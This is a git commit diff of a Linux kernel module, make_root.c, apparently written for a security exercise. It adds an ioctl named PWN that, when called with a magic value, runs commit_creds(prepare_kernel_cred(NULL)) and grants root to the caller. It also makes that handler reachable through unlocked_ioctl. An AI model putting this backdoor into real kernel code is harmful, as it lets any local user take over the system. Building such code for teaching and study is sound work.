db43cd77ffa1f8098516535b187f2339874163f8
Yan <yans@yancomm.net>
2020-10-28 02:45:44 -0700

    fixes

--- src/make_root.c
+++ src/make_root.c
@@ -5,6 +5,8 @@
 #include <linux/cred.h>
 #include <linux/fs.h>
 
+#define PWN _IO('p', 1)
+
 MODULE_LICENSE("GPL"); 
 
 static int device_open(struct inode *inode, struct file *filp)
@@ -32,7 +34,7 @@ static ssize_t device_write(struct file *filp, const char *buf, size_t len, loff
 static long device_ioctl(struct file *filp, unsigned int ioctl_num, unsigned long ioctl_param)
 {
         printk(KERN_ALERT "Got ioctl argument %d!", ioctl_num);
-        if (ioctl_num == 1337)
+        if (ioctl_num == PWN && ioctl_param == 0x13371337)
         {
         	printk(KERN_ALERT "Granting root access!");
     		commit_creds(prepare_kernel_cred(NULL));
@@ -43,7 +45,7 @@ static long device_ioctl(struct file *filp, unsigned int ioctl_num, unsigned lon
 static struct file_operations fops = {
   	.read = device_read,
   	.write = device_write,
-  	.compat_ioctl = device_ioctl,
+  	.unlocked_ioctl = device_ioctl,
   	.open = device_open,
   	.release = device_release
 };
